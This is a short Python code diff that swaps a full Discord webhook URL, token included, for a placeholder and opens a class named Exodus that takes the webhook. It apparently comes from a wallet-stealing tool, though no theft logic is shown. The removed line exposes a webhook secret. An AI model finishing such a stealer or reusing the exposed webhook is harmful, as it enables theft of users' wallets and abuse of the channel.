@@ -1,6 +1,6 @@
 from libs.libs import *
 
-webhook = 'https://discord.com/api/webhooks/1262469390469693471/W-fncfCFfJ_RtGR7ZX2-Q8oOWm-qiBH0Pu9jpqjZvB3THuyjACBbCrGRqCwa3cmMbU6u'
+webhook = 'webhookhere'
 
 class Exodus:
     def __init__(self, webhook):
